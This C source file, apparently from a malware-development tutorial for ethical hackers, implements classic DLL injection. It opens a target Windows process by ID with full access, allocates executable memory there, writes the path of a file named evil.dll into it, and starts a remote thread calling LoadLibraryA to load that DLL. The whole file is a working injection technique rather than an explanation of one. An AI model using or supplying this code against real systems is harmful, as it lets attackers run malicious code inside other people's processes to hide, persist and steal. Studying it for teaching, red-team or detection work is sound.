/*
 * Malware Development for Ethical Hackers
 * hack.c
 * example of classic DLL injection
 * author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ntdll")

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
  HANDLE             ProcessHandle,
  PVOID              *BaseAddress,
  ULONG              ZeroBits,
  PULONG             RegionSize,
  ULONG              AllocationType,
  ULONG              Protect
);

char maliciousLibraryPath[] = "C:\\temp\\evil.dll";
unsigned int maliciousLibraryPathLength = sizeof(maliciousLibraryPath) + 1;

int main(int argc, char* argv[]) {
  HANDLE targetProcess; // Target process handle
  HANDLE remoteThread;  // Remote thread
  LPVOID remoteBuffer;  // Remote buffer for data

  // Obtain handles to kernel32 and ntdll and retrieve function pointer
  HMODULE kernel32Handle = GetModuleHandle("Kernel32");
  HMODULE ntdllHandle = GetModuleHandle("ntdll");
  VOID *loadLibraryFunction = GetProcAddress(kernel32Handle, "LoadLibraryA");

  // Parse process ID
  if (atoi(argv[1]) == 0) {
    printf("Process ID not found. Exiting...\n");
    return -1;
  }
  printf("Process ID: %i", atoi(argv[1]));
  targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));

  pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdllHandle, "NtAllocateVirtualMemory");  

  // Allocate memory buffer in the remote process
  myNtAllocateVirtualMemory(targetProcess, &remoteBuffer, 0, (PULONG)&maliciousLibraryPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  // Copy the malicious DLL path to the remote process
  WriteProcessMemory(targetProcess, remoteBuffer, maliciousLibraryPath, maliciousLibraryPathLength, NULL);

  // Start a new thread in the target process
  remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryFunction, remoteBuffer, 0, NULL);
  CloseHandle(targetProcess);
  return 0;
}
